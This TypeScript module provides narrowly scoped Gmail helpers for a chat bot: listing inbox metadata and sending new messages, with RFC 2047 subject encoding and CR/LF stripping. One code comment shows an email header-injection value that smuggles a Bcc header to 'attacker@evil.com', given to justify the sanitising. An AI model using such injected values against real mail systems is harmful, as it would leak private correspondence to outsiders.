// Gmail API helpers (PLAN.md 17.28) — the fifth Google service this bot
// connects to (after Drive, Calendar, Sheets, Tasks). Deliberately scoped
// narrower than every prior integration: read-only inbox summaries (no
// message body fetch, metadata only) plus sending a brand-new message — no
// reply/forward/archive/delete/mark-as-read/label management. Email is far
// more sensitive than a to-do list or a calendar event (an appointment typo
// only confuses you; a wrong email address sends your words to a stranger),
// so this stays as narrow as it can while still doing what was actually
// asked for — see PLAN.md 17.28 for the confirm-core-changes record of that
// scoping decision.

const GMAIL_BASE = "https://gmail.googleapis.com/gmail/v1/users/me";

// Single source of truth for what counts as an email address here — both
// gmailCommands.ts (direct chat command) and aiInterpreter.ts (validateIntent
// for the AI-interpreted email_send intent) import this rather than each
// keeping their own copy, so a future tightening/loosening can't silently
// drift between the two entry points.
export const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

/** Thrown when the linked Google account's refresh token predates the
 * gmail.readonly/gmail.send scopes — the caller should prompt the user to
 * re-link. */
export class InsufficientGmailScopeError extends Error {}

/** Thrown when the Google Cloud project itself hasn't turned the Gmail API
 * on — re-linking the Google account can't fix this, only enabling the API
 * in Google Cloud Console can (see worker/README.md setup step 3.5). */
export class GmailApiDisabledError extends Error {}

async function gmailFetch(accessToken: string, path: string, init: RequestInit = {}): Promise<any> {
  const res = await fetch(`${GMAIL_BASE}${path}`, {
    ...init,
    headers: {
      ...init.headers,
      Authorization: `Bearer ${accessToken}`,
      "Content-Type": "application/json",
    },
  });
  if (res.status === 401 || res.status === 403) {
    const bodyText = await res.text();
    // Same two-different-403-problems distinction as calendar.ts's
    // calendarFetch/tasks.ts's tasksFetch — see their own comments for why
    // telling them apart matters for which fix actually applies.
    if (/accessNotConfigured|has (not|n't) been used in project|it is disabled/i.test(bodyText)) {
      throw new GmailApiDisabledError(bodyText);
    }
    throw new InsufficientGmailScopeError(bodyText);
  }
  if (!res.ok) {
    throw new Error(`Gmail API error (${res.status}): ${await res.text()}`);
  }
  if (res.status === 204) return null;
  return res.json();
}

export interface EmailSummary {
  id: string;
  from: string;
  subject: string;
  snippet: string;
}

function headerValue(headers: Array<{ name: string; value: string }> | undefined, name: string): string {
  return headers?.find((h) => h.name.toLowerCase() === name.toLowerCase())?.value ?? "";
}

/** Most recent inbox messages, optionally unread-only. Metadata only (From/
 * Subject headers + Gmail's own snippet) — the full message body is never
 * fetched, keeping both the API surface and the LINE reply small. */
export async function listRecentEmails(
  accessToken: string,
  opts: { unreadOnly?: boolean; maxResults?: number } = {}
): Promise<EmailSummary[]> {
  const listQuery = new URLSearchParams({
    q: opts.unreadOnly ? "in:inbox is:unread" : "in:inbox",
    maxResults: String(opts.maxResults ?? 5),
  });
  const list = await gmailFetch(accessToken, `/messages?${listQuery}`);
  const ids: string[] = ((list.messages ?? []) as any[]).map((m) => m.id);
  const metaQuery = "format=metadata&metadataHeaders=From&metadataHeaders=Subject";
  // allSettled, not all: a message can vanish (deleted/archived) in the gap
  // between the list() call above and this per-id get() — that single 404
  // shouldn't take down the whole "เช็คอีเมล" reply and hide the other,
  // perfectly fetchable unread messages behind a generic error instead.
  const results = await Promise.allSettled(ids.map((id) => gmailFetch(accessToken, `/messages/${id}?${metaQuery}`)));
  for (const r of results) {
    if (r.status === "rejected") console.error("listRecentEmails: one message fetch failed, skipping it", r.reason);
  }
  const messages = results.filter((r): r is PromiseFulfilledResult<any> => r.status === "fulfilled").map((r) => r.value);
  return messages.map((m) => ({
    id: m.id,
    from: headerValue(m.payload?.headers, "From") || "(ไม่ทราบผู้ส่ง)",
    subject: headerValue(m.payload?.headers, "Subject") || "(ไม่มีหัวข้อ)",
    snippet: m.snippet ?? "",
  }));
}

// A header value (RFC 5322) is a single line — any \r or \n embedded in it
// ends that line early and starts a new one, letting whatever comes after
// be read as additional headers (a "Subject: hi\nBcc: attacker@evil.com"
// draft becomes a real Bcc header on the sent message). Both call sites
// validate `to` against EMAIL_RE (which already excludes whitespace) before
// this ever runs, but `subject` is free-form user text, and gmailCommands.ts's
// command parser deliberately uses a dotAll regex so a multi-line email body
// can be typed — that same dotAll-ness lets a newline slip into the *subject*
// capture too. Stripping breaks here, not just at the callers, so this stays
// safe regardless of what future caller sends it a value.
function stripHeaderBreaks(value: string): string {
  return value.replace(/[\r\n]+/g, " ").trim();
}

// Header values must stay ASCII per RFC 5322 — a Thai subject line needs
// RFC 2047 encoded-word wrapping. The body doesn't need this: it's UTF-8
// text sitting after the headers, and the entire raw message (headers +
// body together) gets base64url-encoded as one blob below, so raw UTF-8
// bytes in the body travel through untouched.
function encodeMimeHeaderValue(value: string): string {
  if (/^[\x00-\x7F]*$/.test(value)) return value;
  const bytes = new TextEncoder().encode(value);
  let binary = "";
  for (const b of bytes) binary += String.fromCharCode(b);
  return `=?UTF-8?B?${btoa(binary)}?=`;
}

function base64UrlFromBytes(bytes: Uint8Array): string {
  let binary = "";
  for (const b of bytes) binary += String.fromCharCode(b);
  return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function buildRawMessage(to: string, subject: string, body: string): string {
  const lines = [
    `To: ${stripHeaderBreaks(to)}`,
    `Subject: ${encodeMimeHeaderValue(stripHeaderBreaks(subject))}`,
    "MIME-Version: 1.0",
    'Content-Type: text/plain; charset="UTF-8"',
    "",
    body,
  ];
  return base64UrlFromBytes(new TextEncoder().encode(lines.join("\r\n")));
}

export async function sendEmail(accessToken: string, to: string, subject: string, body: string): Promise<string> {
  const sent = await gmailFetch(accessToken, "/messages/send", {
    method: "POST",
    body: JSON.stringify({ raw: buildRawMessage(to, subject, body) }),
  });
  return sent.id;
}
